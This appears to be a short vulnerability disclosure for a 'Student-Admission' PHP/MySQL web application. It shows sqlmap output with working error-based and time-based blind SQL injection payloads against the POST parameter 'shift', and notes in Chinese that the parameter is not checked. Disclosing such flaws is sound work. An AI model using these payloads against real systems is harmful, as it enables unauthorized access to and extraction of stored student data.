# Student-Admission

### Sqlinjection
![image](https://user-images.githubusercontent.com/72059221/182750831-21ba3a4b-d99f-484b-813f-0d175d044ce4.png)
![image](https://user-images.githubusercontent.com/72059221/182750900-d34a0889-3f8b-4a3b-85a7-fddb16385258.png)
![image](https://user-images.githubusercontent.com/72059221/182750935-56fa5112-fdcd-4bb5-ba7e-762cffaaf506.png)

```
POST parameter 'shift' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 1581 HTTP(s) requests:
---
Parameter: shift (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: sname=bbb&gname=aaa&contact=1&email=1@11.com&address=111111&class=1&shift=1 AND GTID_SUBSET(CONCAT(0x717a766b71,(SELECT (ELT(3656=3656,1))),0x7162766a71),3656)&gender=female&blgroup=abc&division=1&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sname=bbb&gname=aaa&contact=1&email=1@11.com&address=111111&class=1&shift=1 AND (SELECT 2934 FROM (SELECT(SLEEP(5)))GVhT)&gender=female&blgroup=abc&division=1&submit=Submit
---
[09:45:36] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.39, PHP 5.6.9
back-end DBMS: MySQL >= 5.6
```

![image](https://user-images.githubusercontent.com/72059221/182751071-f90c74c8-2632-4838-ac0d-a7cf4d0ebac0.png)

#### 没有检查Shift变量内容    

![image](https://user-images.githubusercontent.com/72059221/182751180-d03a9653-d4b1-4dfd-b0a9-d5535f98f6bf.png)
